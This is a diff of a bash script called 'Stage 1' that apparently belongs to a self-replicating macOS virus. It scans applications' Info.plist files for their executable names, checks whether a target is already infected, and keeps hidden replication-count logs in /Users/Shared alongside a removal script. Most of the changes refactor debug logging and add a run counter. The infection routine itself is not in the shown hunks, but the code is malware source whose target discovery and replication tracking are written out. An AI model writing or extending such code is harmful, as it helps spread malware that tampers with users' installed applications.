@@ -1,20 +1,25 @@
 #!/bin/bash
+#sed -E fix is thanks to https://stackoverflow.com/a/28072266/8390381
 #Stage 1, re-written:
 DEBUG=1
-#DEBUG has to be enabled (1) for LOGGING to be enabled (1)
+#LOGGING isn't dependant anymore on DEBUG being enabled (1)
 LOGGING=1
 #Do not run this script in /Users/Shared/, as the logging would mess with the log
 #for removal.sh
 Path=$(pwd)
 if [ -f ./.stage-1.log ] && [ ${Path} != "/Users/Shared/" ] && [ ${LOGGING} == 1 ]
 then
+	#Experimental line, to be tested on macOS VM:
+	RC01=$(sed -nE "1s/.*\(.\)$/\1/p" ./.stage-1.log)
+	RC02=${RC01}
+	let "RC02++"
+	sed -in "1s/${RC01}/${RC02}/" ./.stage-1.log
 	echo "" >> ./.stage-1.log
 else
 	#Create local log and a run count (to be edited at the end)
 	touch ./.stage-1.log
-	echo "Run count: 0" >> ./.stage-1.log
+	echo "Run count: 1" >> ./.stage-1.log
 	echo "Replication count: 0" >> ./.stage-1.log
-	echo "Fails count: 0" >> ./.stage-1.log
 	echo "" >> ./.stage-1.log
 fi
 if [ ${Path} == "/Users/Shared" ] && [ ${LOGGING} == 1 ]
@@ -30,10 +35,10 @@ Script=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )$0
 if [ ${DEBUG} == 1 ]
 then
 	echo "Script is ${Script}"
-	if [ ${LOGGING} == 1 ]
-	then
-		echo "Script is ${Script}" >> ./.stage-1.log
-	fi
+fi
+if [ ${LOGGING} == 1 ]
+then
+	echo "Script is ${Script}" >> ./.stage-1.log
 fi
 #It appears that some plists are gibberish for some reason, they can be identified 
 #by ${ExecLineNum} having a value of 1 (after let adding one to its value)
@@ -49,11 +54,11 @@ do
 	then
 		echo "Target is ${Target}"
 		echo "TargetPlist is ${TargetPlist}"
-		if [ ${LOGGING} == 1 ]
-		then
-			echo "Target is ${Target}" >> ./.stage-1.log
-			echo "TargetPlist is ${TargetPlist}" >> ./.stage-1.log
-		fi
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "Target is ${Target}" >> ./.stage-1.log
+		echo "TargetPlist is ${TargetPlist}" >> ./.stage-1.log
 	fi
 	#Using sed to get the line number where the executable name is stored in the
 	#target application's Info.plist (by looking for CFBundleExecutable and then
@@ -63,20 +68,20 @@ do
 	if [ ${DEBUG} == 1 ]
 	then
 		echo "ExecLineNum is ${ExecLineNum}"
-		if [ ${LOGGING} == 1 ]
-		then
-			echo "ExecLineNum is ${ExecLineNum}" >> ./.stage-1.log
-		fi
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "ExecLineNum is ${ExecLineNum}" >> ./.stage-1.log
 	fi
 	if [ ${ExecLineNum} == 1 ]
 	then
 		if [ ${DEBUG} == 1 ]
 		then
 			echo "IsReadablePlist == false"
-			if [ ${LOGGING} == 1 ]
-			then
-				echo "IsReadablePlist == false" >> ./.stage-1.log
-			fi
+		fi
+		if [ ${LOGGING} == 1 ]
+		then
+			echo "IsReadablePlist == false" >> ./.stage-1.log
 		fi
 		IsReadablePlist="false"
 	else
@@ -88,27 +93,29 @@ do
 			echo "ExecLineFull is ${ExecLineFull}"
 			echo "TmpName is ${TmpName}"
 			echo "TmpName file is /private/tmp/${TmpName}"
-			if [ ${LOGGING} == 1 ]
-			then
-				echo "ExecLineFull is ${ExecLineFull}" >> ./.stage-1.log
-				echo "TmpName is ${TmpName}" >> ./.stage-1.log
-				echo "TmpName file is /private/tmp/${TmpName}" >> ./.stage-1.log
-			fi
+		fi
+		if [ ${LOGGING} == 1 ]
+		then
+			echo "ExecLineFull is ${ExecLineFull}" >> ./.stage-1.log
+			echo "TmpName is ${TmpName}" >> ./.stage-1.log
+			echo "TmpName file is /private/tmp/${TmpName}" >> ./.stage-1.log
 		fi
 		ExecName=$(sed -nE "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/${TmpName}")
-		#-E after sed is thanks to https://stackoverflow.com/a/28072266/8390381
 		if [ ${DEBUG} == 1 ]
 		then
 			echo "ExecName is ${ExecName}"
-			if [ ${LOGGING} == 1 ]
-			then
-				echo "ExecName is ${ExecName}" >> ./.stage-1.log
-			fi
+		fi
+		if [ ${LOGGING} == 1 ]
+		then
+			echo "ExecName is ${ExecName}" >> ./.stage-1.log
 		fi
 		rm "/private/tmp/${TmpName}"
-		if [ ! -f "/private/tmp/${TmpName}" ] && [ ${DEBUG} == 1 ]
+		if [ ! -f "/private/tmp/${TmpName}" ]
 		then
-			echo "TmpName (${TmpName}) deleted"
+			if [ ${DEBUG} == 1 ]
+			then
+				echo "TmpName (${TmpName}) deleted"
+			fi
 			if [ ${LOGGING} == 1 ]
 			then
 				echo "TmpName (${TmpName}) deleted" >> ./.stage-1.log
@@ -120,49 +127,52 @@ do
 			if [ ${DEBUG} == 1 ]
 			then
 				echo "IsAlreadyPresent == true"
-				if [ ${LOGGING} == 1 ]
-				then
-					echo "IsAlreadyPresent == true" >> ./.stage-1.log
-				fi
+			fi
+			if [ ${LOGGING} == 1 ]
+			then
+				echo "IsAlreadyPresent == true" >> ./.stage-1.log
 			fi
 			IsAlreadyPresent="true"
 		fi
 		if [ ${DEBUG} == 1 ]
 		then
 			echo "IsReadablePlist == true"
-			if [ ${LOGGING} == 1 ]
-			then
-				echo "IsReadablePlist == true" >> ./.stage-1.log
-			fi
+		fi
+		if [ ${LOGGING} == 1 ]
+		then
+			echo "IsReadablePlist == true" >> ./.stage-1.log
 		fi
 		IsReadablePlist="true"
 	fi
 done
-#Check for stage 1 log/info file (/Users/Shared/.stage-1.log) (all other non-
-#commonly-visited [but always present] directories [other than /private/tmp/,
-#but that's temporary] require sudo/root perms)
-#./.stage-1.log is for logging of the script, and /Users/Shared/.stage-1.log
-#if for being read by removal.sh
+#Check for stage 1 log/info file (/Users/Shared/.stage-1.log)
+#This location was chosen because all other non-commonly-visited [but always
+#present] directories [other than /private/tmp/, but that's temporary] require
+#sudo/root perms)
+#./.stage-1.log is for script logging, and /Users/Shared/.stage-1.log is for
+#being read by removal.sh
 if [ -f /Users/Shared/.stage-1.log ]
 then
 	if [ ${DEBUG} == 1 ]
 	then
 		echo "/Users/Shared/.stage-1.log present"
-		if [ ${LOGGING} == 1 ]
-		then
-			echo "/Users/Shared/.stage-1.log present" >> ./.stage-1.log
-		fi
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "/Users/Shared/.stage-1.log present" >> ./.stage-1.log
 	fi
 else
 	touch "/Users/Shared/.stage-1.log"
+	echo "Replicated 0 times" >> "/Users/Shared/.stage-1.log"
+	echo "" >> "/Users/Shared/.stage-1.log"
 	if [ ${DEBUG} == 1 ]
 	then
 		echo "/Users/Shared/.stage-1.log not present"
 		echo "/Users/Shared/.stage-1.log created"
-		if [ ${LOGGING} == 1 ]
-		then
-			echo "/Users/Shared/.stage-1.log not present" >> ./.stage-1.log
-			echo "/Users/Shared/.stage-1.log created" >> ./.stage-1.log
-		fi
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "/Users/Shared/.stage-1.log not present" >> ./.stage-1.log
+		echo "/Users/Shared/.stage-1.log created" >> ./.stage-1.log
 	fi
 fi
